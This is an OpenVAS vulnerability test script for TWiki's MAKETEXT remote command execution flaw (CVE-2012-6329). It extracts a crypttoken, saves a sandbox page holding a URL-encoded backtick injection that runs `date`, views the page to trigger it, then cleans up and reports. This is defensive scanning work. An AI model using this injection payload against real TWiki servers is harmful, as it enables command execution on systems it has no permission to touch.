###############################################################################
# OpenVAS Vulnerability Test
#
# TWiki 'MAKETEXT' variable Remote Command Execution Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:twiki:twiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802048");
  script_version("2019-05-20T11:12:48+0000");
  script_bugtraq_id(56950);
  script_cve_id("CVE-2012-6329", "CVE-2012-6330");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"last_modification", value:"2019-05-20 11:12:48 +0000 (Mon, 20 May 2019)");
  script_tag(name:"creation_date", value:"2012-12-27 12:46:41 +0530 (Thu, 27 Dec 2012)");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("TWiki 'MAKETEXT' variable Remote Command Execution Vulnerability");

  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_twiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("twiki/detected");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute shell commands by
  Perl backtick (``) operators.");

  script_tag(name:"affected", value:"TWiki version 5.1.0 to 5.1.2, 5.0.x, 4.3.x, 4.2.x, 4.1.x, 4.0.x");

  script_tag(name:"insight", value:"flaw is due to improper validation of '%MAKETEXT{}%' Twiki variable
  (UserInterfaceInternationalisation is enabled) which is used to localize
  user interface content to a language of choice.");

  script_tag(name:"solution", value:"Upgrade to TWiki-5.1.3 or later or apply patch.");

  script_tag(name:"summary", value:"The host is running TWiki and is prone to remote command execution
  vulnerability.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51548");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/23579");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118856");
  script_xref(name:"URL", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2012-6329");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! twikiPort = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:twikiPort ) ) exit( 0 );

if( dir == "/" ) dir = "";

useragent = http_get_user_agent();
host = http_host_name(port:twikiPort);

sandbox_page = "/Sandbox/OVTestPage123";

url1 = dir + "/edit" + sandbox_page + "?nowysiwyg=1";
req1 = string("GET ", url1 , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: TWIKISID=\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 0\r\n\r\n");
res1 = http_keepalive_send_recv(port:twikiPort, data:req1);

if(res1 !~ "^HTTP/1\.[01] 200" || 'name="crypttoken" value="' >!< res1){
  exit(0);
}

## Extract crypt_token and Exit if not present
crypt_token = eregmatch(pattern:'name="crypttoken" value="([0-9a-f]*)"',
                        string:res1);
if(!crypt_token[1]){
  exit(0);
}

crypt_token = crypt_token[1];

cookie = eregmatch(pattern:"Set-Cookie: TWIKISID=([0-9a-f]*);", string:res1);
if(cookie[1]){
  cookie = cookie[1];
} else {
  cookie = "3570fa8ce33f52bcb695765e7bf781a0";
}

## Insert RCE and save the page
url2 = dir + "/save" + sandbox_page;
post_data = string("crypttoken=", crypt_token , "&text=VT-Test%20%25",
            "MAKETEXT%7B%22APt%20%5B_1%5D%20rxCsi%5C%5C'%7D%3B%20%60date",
            "%60%3B%20%7B%20%23%22%20args%3D%22QpR%22%7D%25");
req2 = string("POST ", url2 , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: TWIKISID=", cookie, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", (strlen(post_data)), "\r\n\r\n",
             post_data );
res2 = http_keepalive_send_recv(port:twikiPort, data:req2);

## Execute RCE by accessing the page
url3 = dir + "/view" + sandbox_page;
req3 = string("GET ", url3 , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: TWIKISID=\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 0\r\n\r\n");
res3 = http_keepalive_send_recv(port:twikiPort, data:req3);

## RCE Clenup
url4 = dir + "/save" + sandbox_page;
post_data = string("crypttoken=", crypt_token , "&text=OV-Test");
req4 = string("POST ", url4 , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: TWIKISID=", cookie, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", (strlen(post_data)), "\r\n\r\n",
             post_data );
res4 = http_keepalive_send_recv(port:twikiPort, data:req4);

if(res1 =~ "^HTTP/1\.[01] 200" && "}; `date`; {" >!< res3 &&
   egrep(string:res3, pattern:">VT-Test</a></span> HASH\(0x")){
  report = report_vuln_url( port:twikiPort, url:url1 );
  security_message(port:twikiPort, data:report);
  exit(0);
}

exit(99);
